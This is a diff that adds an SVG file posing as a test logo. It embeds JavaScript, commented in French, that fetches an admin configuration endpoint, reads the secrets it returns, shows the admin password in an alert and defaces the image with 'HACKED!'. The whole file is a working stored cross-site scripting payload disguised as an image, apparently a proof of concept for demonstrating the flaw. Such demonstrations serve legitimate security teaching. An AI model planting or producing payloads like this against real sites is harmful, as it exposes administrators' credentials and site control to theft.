@@ -1,0 +1,26 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">
+  <circle cx="150" cy="150" r="100" fill="red" />
+  <text x="50%" y="50%" text-anchor="middle" fill="white" font-size="20" font-family="Arial">LOGO TEST</text>
+
+  <script type="text/javascript">
+    <![CDATA[
+      console.log("SVG chargé, exécution du script...");
+
+      // 1. On cible l'API vulnérable créée par l'Utilisateur 1
+      fetch('/admin/config')
+        .then(response => response.json())
+        .then(data => {
+            // 2. On récupère les secrets
+            console.log("Données volées :", data);
+
+            // 3. EFFET VISUEL : On affiche les secrets dans une alerte
+            alert("⚠️ FAIL DE SÉCURITÉ ⚠️\n\nJ'ai volé le mot de passe admin :\n" + data.password);
+
+            // 4. (Bonus) On modifie l'image elle-même pour montrer qu'on a le contrôle
+            document.querySelector('circle').setAttribute('fill', 'black');
+            document.querySelector('text').textContent = "HACKED!";
+        })
+        .catch(err => console.error("Erreur lors du piratage :", err));
+    ]]>
+  </script>
+</svg>
